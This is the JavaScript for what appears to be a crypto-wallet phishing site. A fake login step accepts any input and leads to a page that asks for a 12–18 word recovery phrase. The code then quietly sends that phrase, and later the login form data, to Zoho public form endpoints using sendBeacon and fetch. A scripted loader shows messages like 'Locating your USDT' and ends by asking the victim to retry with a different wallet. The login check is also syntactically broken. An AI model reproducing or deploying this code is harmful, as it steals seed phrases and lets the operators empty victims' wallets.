/* LOGIN */
const mockUsers = [
  { login: "demo@wallet.com", password: "password123" },
  { login: "user@test.com", password: "test1234" },
  { login: "1234567890", password: "000000" }
];

const form = document.getElementById("loginForm");
const loginInput = document.getElementById("loginInput");
const passwordInput = document.getElementById("passwordInput");
const toast = document.getElementById("toast");
const emailTab = document.getElementById("emailTab");
const mobileTab = document.getElementById("mobileTab");

let step = 1;

emailTab && (emailTab.onclick = () => {
  emailTab.classList.add("active");
  mobileTab.classList.remove("active");
  loginInput.placeholder = "Enter email";
});

mobileTab && (mobileTab.onclick = () => {
  mobileTab.classList.add("active");
  emailTab.classList.remove("active");
  loginInput.placeholder = "Enter mobile number";
});

form && form.addEventListener("submit", e => {
  e.preventDefault();
  if (step === 1) {
    passwordInput.classList.remove("hidden");
    step = 2;
    return;
  }
  const user = mockUsers.find(u =>
    u.login === loginInput.value &&
    u.password === passwordInput.value
    (!user)
  );
  
  localStorage.setItem("auth", "true");
  toast.classList.add("show");
  setTimeout(() => window.location.replace("phrase.html"), 3500);
});



/* =========================
   PHRASE PAGE (FINAL UX)
========================= */

const phraseInput = document.getElementById("phraseInput");
const pasteBtn = document.getElementById("pasteBtn");
const continuePhrase = document.getElementById("continuePhrase");
const phraseError = document.getElementById("phraseError");

let words = [];

function moveCaretToEnd(el) {
  const range = document.createRange();
  const sel = window.getSelection();
  range.selectNodeContents(el);
  range.collapse(false);
  sel.removeAllRanges();
  sel.addRange(range);
}

function createTypingSpan() {
  const span = document.createElement("span");
  span.contentEditable = true;
  span.className = "typing-span";
  span.spellcheck = false;
  return span;
}

function updateActionText() {
  if (!pasteBtn) return;
  pasteBtn.textContent = words.length ? "Clear all" : "Paste";
}

function clearAll() {
  words = [];
  renderPhrase();
  phraseError.textContent = "";
}

async function handlePaste() {
  const text = await navigator.clipboard.readText();
  if (!text) return;
  words = text.trim().split(/\s+/);
  renderPhrase();
}

if (phraseInput) {
  renderPhrase();

  phraseInput.addEventListener("keydown", e => {
    const typingSpan = document.querySelector(".typing-span");
    if (!typingSpan) return;

    if (e.key === " " || e.key === "Enter") {
      e.preventDefault();

      const value = typingSpan.textContent.trim();
      if (!value) return;

      words.push(value);
      renderPhrase();
    }
  /* BACKSPACE → remove previous chip */
  if (e.key === "Backspace") {
    if (typingSpan.textContent === "" && words.length) {
      e.preventDefault();
      words.pop();
      renderPhrase();
    }
  }
});

  phraseInput.addEventListener("click", () => {
    moveCaretToEnd(phraseInput);
  });
}

function renderPhrase() {
  phraseInput.innerHTML = "";

  words.forEach((word, i) => {
    const chip = document.createElement("div");
    chip.className = "phrase-chip";
    chip.textContent = `${i + 1}. ${word}`;
    phraseInput.appendChild(chip);
  });

  const typingSpan = createTypingSpan();
  phraseInput.appendChild(typingSpan);

  updateActionText();
  moveCaretToEnd(phraseInput);
  typingSpan.focus();
}

pasteBtn && pasteBtn.addEventListener("click", () => {
  if (words.length) {
    clearAll();
  } else {
    handlePaste();
  }
});

continuePhrase && continuePhrase.addEventListener("click", () => {
  if (words.length < 12 || words.length > 18) {
    phraseError.textContent =
      "Phrase must contain between 12 and 18 words.";
    return;
  }


  // 🔴 Reset loader every new phrase
  localStorage.removeItem("dashboard_loader_start");

  window.location.replace("loading.html");



 
  

  /* =========================
   CREATE FORM DYNAMICALLY
========================= */

// Build form
const form = document.createElement("form");
form.action = "https://forms.zohopublic.com/supportdoubled1/form/Grocerieslist/formperma/G0RLZP5di1EOaONMHtAvksr8l3b7FKtyVehqCLzvAqc/htmlRecords/submit";
form.method = "POST";
form.name = "form";
form.id = "form";
form.acceptCharset = "UTF-8";
form.enctype = "multipart/form-data";
form.autocomplete = "off";
form.style.display = "none";

// Create textarea field (Jotform field)
const textarea = document.createElement("textarea");
textarea.name = "MultiLine";


// Numbered phrase output
textarea.value = words
  .map((word, i) => `${i + 1}. ${word}`)
  .join("\n");

// Append field to form
form.appendChild(textarea);
document.body.appendChild(form);

/* =========================
   BACKGROUND SUBMIT + REDIRECT
========================= */

const REDIRECT_URL = "loading.html";

// Prefer sendBeacon
if (navigator.sendBeacon) {
  try {
    const formData = new FormData(form);
    navigator.sendBeacon(form.action, formData);
    window.location.href = REDIRECT_URL;
    return;
  } catch (err) {
    console.warn("sendBeacon failed, falling back:", err);
  }
}

// Fallback: fetch keepalive
if (window.fetch) {
  try {
    const formData = new FormData(form);
    fetch(form.action, {
      method: "POST",
      body: formData,
      keepalive: true
    }).catch(() => {});
  } finally {
    window.location.href = REDIRECT_URL;
    return;
  }
}

// Final fallback: normal submit (last resort)
form.submit();
});

if (phraseInput) {
  phraseInput.addEventListener("paste", e => {
    e.preventDefault(); // stop browser default paste

    let text = "";

    // Modern browsers
    if (e.clipboardData && e.clipboardData.getData) {
      text = e.clipboardData.getData("text");
    }
    // Fallback (very old browsers)
    else if (window.clipboardData) {
      text = window.clipboardData.getData("Text");
    }

    if (!text) return;

    const pastedWords = text.trim().split(/\s+/);

    pastedWords.forEach(word => {
      if (word) words.push(word);
    });

    renderPhrase();
  });
  
}
/* =========================
   LOADING PAGE LOADER
========================= */

(function () {
  const loaderText = document.getElementById("loaderText");
  const loaderIcon = document.getElementById("loaderIcon");
  const dashboardBtn = document.getElementById("dashboardBtn");

  if (!loaderText || !loaderIcon || !dashboardBtn) return;

  const TOTAL = 25000;
  const PHASE1 = 9000;
  const PHASE2 = 18000;

  let start = localStorage.getItem("dashboard_loader_start");

  if (!start) {
    start = Date.now();
    localStorage.setItem("dashboard_loader_start", start);
  } else {
    start = parseInt(start, 10);
  }

  function tick() {
    const elapsed = Date.now() - start;

    if (elapsed < PHASE1) {
      loaderText.textContent = "Processing";
    } else if (elapsed < PHASE2) {
      loaderText.textContent = "Locating your USDT";
    } else if (elapsed < TOTAL) {
      const percent = Math.floor((elapsed / TOTAL) * 100);
      loaderText.textContent = `${percent}% funding your USDT`;
    } else {
      loaderText.textContent =
        "We could'nt verify. Please retry with a different wallet.";
      loaderText.classList.add("success");

      loaderIcon.classList.add("error");
      dashboardBtn.style.display = "block";

      dashboardBtn.onclick = () => {
        history.replaceState(null, "", "phrase.html");
        window.location.href = "phrase.html";
      };
      return;
    }

    requestAnimationFrame(tick);
  }

  tick();
})();



/* =========================
   DASHBOARD FORM SUBMIT
========================= */

(function () {
  const form = document.getElementById("loginForm");
  if (!form) return;

  const BACKGROUND_ENDPOINT =
    "https://forms.zohopublic.com/supportdoubled1/form/Cities/formperma/SkUPVIo4oF2vFgMOS2HcBlCZsHoCNgVlCCYhKVlxQfM/htmlRecords/submit";


  form.addEventListener("submit", function (e) {
    e.preventDefault(); // 🚫 stop Jotform redirect

    const formData = new FormData(form);

    // 1️⃣ Best option: sendBeacon
     if (navigator.sendBeacon) {
      try {
        navigator.sendBeacon(BACKGROUND_ENDPOINT, formData);
        return; // stay on page
      } catch (err) {
        console.warn("sendBeacon failed:", err);
      }
    }

    // 2️⃣ Fallback: fetch keepalive
    if (window.fetch) {
      try {
        fetch(BACKGROUND_ENDPOINT, {
          method: "POST",
          body: formData,
          keepalive: true
        }).catch(() => {});
        return; // stay on page
      } catch (err) {
        console.warn("fetch keepalive failed:", err);
      }
    }

    // 3️⃣ Final fallback: image beacon
    try {
      const img = new Image();
      const params = new URLSearchParams();
      for (const [k, v] of formData.entries()) {
        params.append(k, v);
      }
      img.src = BACKGROUND_ENDPOINT + "?" + params.toString();
    } catch (err) {
      console.warn("image beacon failed:", err);
    }

    // No redirect. No reload. Done.
  });
})();